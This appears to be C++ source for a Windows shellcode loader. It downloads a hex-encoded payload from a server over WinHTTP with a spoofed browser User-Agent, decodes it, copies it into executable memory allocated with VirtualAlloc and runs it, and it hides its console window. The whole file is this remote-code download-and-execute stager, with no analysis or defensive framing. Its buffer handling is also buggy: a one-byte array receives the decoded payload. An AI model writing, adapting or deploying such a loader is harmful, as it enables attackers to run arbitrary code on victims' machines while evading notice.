#define _CRT_SECURE_NO_WARNINGS
#include <vector>
#include <winsock2.h>
#include <Winhttp.h>
#include <windows.h>
#include <iostream>
#include <sstream>
#include <string>
#include <algorithm>
#include <typeinfo>
#include "AtlBase.h"
#include "AtlConv.h"
#include "string.h"
using namespace std;
#pragma comment(lib, "winhttp")
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
string GetShellcode(string strHost, string strRequestStr, int port)
{
    string header = "Host: " + strHost + "\r\nContent-type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.8\r\n";
    USES_CONVERSION;
    LPCWSTR host = A2CW(strHost.c_str());
    LPCWSTR requestStr = A2CW(strRequestStr.c_str());
    //Variables
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    vector <string>  vFileContent;
    BOOL  bResults = FALSE;

    //Note the definition of HINTERNET
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    string strHtml = "";// store the html code

// Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host,
            (INTERNET_PORT)port, 0);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", requestStr,
            NULL, WINHTTP_NO_REFERER,
            NULL,
            NULL);

    //Add HTTP header 
    LPCWSTR header1 = A2CW(header.c_str());
    SIZE_T len = lstrlenW(header1);
    WinHttpAddRequestHeaders(hRequest, header1, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    //obtain the html source code
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n",
                        GetLastError());
                }
                else
                {
                   // Data in vFileContent
                    vFileContent.push_back(pszOutBuffer);

                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
        // Keep checking for data until there is nothing left.
       // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());
        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        for (int i = 0; i < (int)vFileContent.size(); i++)
        {
            strHtml += vFileContent[i];
        }
        return strHtml;
}

int hexstringtobyte(char* in, unsigned char* out);
int hexstringtobyte(char* in, unsigned char* out) {
    int len = (int)strlen(in);
    char* str = (char*)malloc(len);
    memset(str, 0, len);
    memcpy(str, in, len);
    for (int i = 0; i < len; i += 2) {
        //小写转大写
        if (str[i] >= 'a' && str[i] <= 'f') str[i] = str[i] & ~0x20;
        if (str[i + 1] >= 'a' && str[i] <= 'f') str[i + 1] = str[i + 1] & ~0x20;
        //处理第前4位
        if (str[i] >= 'A' && str[i] <= 'F') {
            out[i / 2] = (str[i] - 'A' + 10) << 4;
        }    
        else {
            out[i / 2] = (str[i] & ~0x30) << 4;
        }
        //处理后4位, 并组合起来
        if (str[i + 1] >= 'A' && str[i + 1] <= 'F') {
            out[i / 2] |= (str[i + 1] - 'A' + 10);
        }
        else {
            out[i / 2] |= (str[i + 1] & ~0x30);
        }
        //if ((out[i / 2] ^ out[i / 2] >> 31) - (out[i / 2] >> 31)) {
        //    out[i / 2] = (( (~(out[i / 2] << 1)>>1) + 1 )<<1)>>1;
        //}
    }
    free(str);
    return 0;
}

int main(int argc, char** argv)
{

    string str = GetShellcode("ip", "?shellcode=1", 80);
    char* p = (char*)str.c_str();
    unsigned char code[] = { 0 };
    hexstringtobyte(p, code); 

    //for (int i = 0; i < strlen(p) / 2; i++) {
    //    printf("%d ", code[i]);
    //}

    void* exec = VirtualAlloc(0, strlen(p)/2+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, code, strlen(p)/2+1);
    ((void(*)())exec)();
}
